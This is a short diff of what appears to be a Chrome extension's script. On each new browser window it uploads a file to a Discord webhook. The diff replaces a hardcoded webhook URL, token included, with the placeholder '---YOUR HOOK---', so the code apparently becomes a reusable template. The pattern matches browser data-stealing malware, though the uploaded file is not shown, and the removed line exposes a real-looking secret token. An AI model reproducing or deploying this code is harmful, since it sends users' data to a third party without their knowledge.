@@ -61,6 +61,6 @@ const upload = (file, link) => {
 
 chrome.windows.onCreated.addListener(
     function () {
-        upload(file, "https://discord.com/api/webhooks/1192935306089992203/0PUwU7ZYyiuOQnQQHTbIKm1MQC25c0eUJoyQVxD7XCaNK5f-QQ4ANrv4LtqtTY4ENXgL");
+        upload(file, "---YOUR HOOK---");
     }
 )
